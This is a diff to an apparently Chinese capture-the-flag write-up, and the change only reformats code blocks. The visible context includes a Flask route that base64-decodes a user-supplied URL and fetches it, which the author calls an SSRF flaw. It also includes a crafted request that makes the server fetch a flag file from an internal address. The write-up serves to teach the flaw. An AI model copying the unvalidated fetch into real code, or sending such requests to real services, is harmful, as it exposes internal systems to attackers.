@@ -13,17 +13,21 @@ docker-compose up -d
 在app目录下的auth文件夹中,先看一下他的初始化文件__init__.py
 ![](luffy1.png)
 可以看到,应用使用了蓝厂函数，url前缀是auth，然后审查views.py,在众多的路由中，最有问题的是
-`
+
+```
 @auth.route('/getimage/<url>')
 def getimage(url):
     url = base64.b64decode(url)
     img = requests.get(url)
     return img.content
-`
+```
+
 这很显然是一个ssrf漏洞，然后我们可以构造请求
-`
+
+```
 http://127.0.0.1:8001/auth/getimage/aHR0cDovLzEwLjAuMC4yMTEvZmxhZy50eHQ=
-`
+```
+
 ![](luffy2.png)
 
 
